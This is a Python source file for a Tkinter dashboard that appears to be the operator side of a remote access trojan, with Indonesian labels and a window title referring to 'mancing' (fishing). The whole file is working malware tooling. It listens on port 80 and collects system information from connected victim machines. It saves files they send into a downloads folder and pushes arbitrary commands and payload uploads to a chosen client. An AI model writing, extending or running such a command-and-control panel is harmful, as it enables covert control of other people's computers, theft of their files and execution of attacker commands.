import threading, tkinter as tk
from tkinter import ttk
import socket, os
from ttkbootstrap import Style

connected_clients = {}
downloads_dir = "downloads"
uploads_dir = "uploads"
os.makedirs(downloads_dir, exist_ok=True)
os.makedirs(uploads_dir, exist_ok=True)

def get_sysinfo(conn):
    try:
        conn.send(b"[SYSINFO]\n")
        return conn.recv(4096).decode().strip()
    except:
        return "?"

def handle_client(conn, addr, gui_update):
    client_id = f"{addr[0]}:{addr[1]}"
    sysinfo = get_sysinfo(conn)
    connected_clients[client_id] = conn
    gui_update("connect", client_id, sysinfo)
    try:
        while True:
            header = conn.recv(16).decode(errors='ignore').strip()
            if header == "[FILE]":
                filename_len = int(conn.recv(4).decode())
                filename = conn.recv(filename_len).decode()
                filedata = b""
                while True:
                    chunk = conn.recv(1024)
                    if b"[ENDFILE]" in chunk:
                        filedata += chunk.split(b"[ENDFILE]")[0]
                        break
                    filedata += chunk
                with open(f"{downloads_dir}/{filename}", "wb") as f:
                    f.write(filedata)
                gui_update("log", client_id, f"[File Diterima] {filename}")
            else:
                data = header + conn.recv(4096).decode(errors='ignore')
                gui_update("log", client_id, data)
    except:
        gui_update("disconnect", client_id, "")
        conn.close()

def start_server(gui_update):
    s = socket.socket()
    s.bind(("0.0.0.0", 80))
    s.listen()
    while True:
        conn, addr = s.accept()
        threading.Thread(target=handle_client, args=(conn, addr, gui_update), daemon=True).start()

def send_file(client_id, filename):
    conn = connected_clients.get(client_id)
    try:
        with open(f"{uploads_dir}/{filename}", "rb") as f:
            data = f.read()
        conn.send(b"[UPLOAD]")
        conn.send(str(len(filename)).zfill(4).encode())
        conn.send(filename.encode())
        conn.send(data + b"[ENDFILE]")
    except:
        pass

def send_command(client_id, cmd):
    conn = connected_clients.get(client_id)
    try:
        if cmd.startswith("upload "):
            send_file(client_id, cmd.split(" ", 1)[1])
        else:
            conn.send(cmd.encode() + b"\n")
    except:
        pass

def start_gui():
    style = Style("darkly")
    w = style.master
    w.title("Dashboard Project Mancing - Makasih Nur Saputra 🗿")
    w.geometry("900x600")
    w.minsize(700, 400)
    w.rowconfigure(2, weight=1)
    w.columnconfigure(0, weight=1)

    label = ttk.Label(w, text="Client Aktif", font=("Segoe UI", 13, "bold"))
    label.grid(row=0, column=0, sticky="w", padx=10, pady=5)

    tree = ttk.Treeview(w, columns=("info",), show="headings", height=5)
    tree.heading("info", text="Info System")
    tree.grid(row=1, column=0, sticky="nsew", padx=10)

    output = tk.Text(w, height=15, bg="#111", fg="#00FF00", insertbackground="#0f0")
    output.grid(row=2, column=0, sticky="nsew", padx=10, pady=5)

    entry = ttk.Entry(w)
    entry.grid(row=3, column=0, sticky="ew", padx=10)

    def on_send(event=None):
        selected = tree.selection()
        if selected:
            client_id = selected[0]
            cmd = entry.get()
            send_command(client_id, cmd)
            output.insert(tk.END, f"[You → {client_id}] {cmd}\n")
            output.see(tk.END)
            entry.delete(0, tk.END)

    entry.bind("<Return>", on_send)
    ttk.Button(w, text="Kirim", command=on_send).grid(row=4, column=0, sticky="e", padx=10, pady=5)

    def gui_update(mode, client_id, data):
        if mode == "connect":
            tree.insert("", "end", iid=client_id, values=(data,))
            output.insert(tk.END, f"[+] {client_id} terkoneksi\n")
            output.see(tk.END)
        elif mode == "disconnect":
            tree.delete(client_id)
            output.insert(tk.END, f"[-] {client_id} terputus\n")
            output.see(tk.END)
        elif mode == "log":
            output.insert(tk.END, f"[{client_id}] {data}\n")
            output.see(tk.END)

    threading.Thread(target=start_server, args=(gui_update,), daemon=True).start()
    w.mainloop()

if __name__ == "__main__":
    start_gui()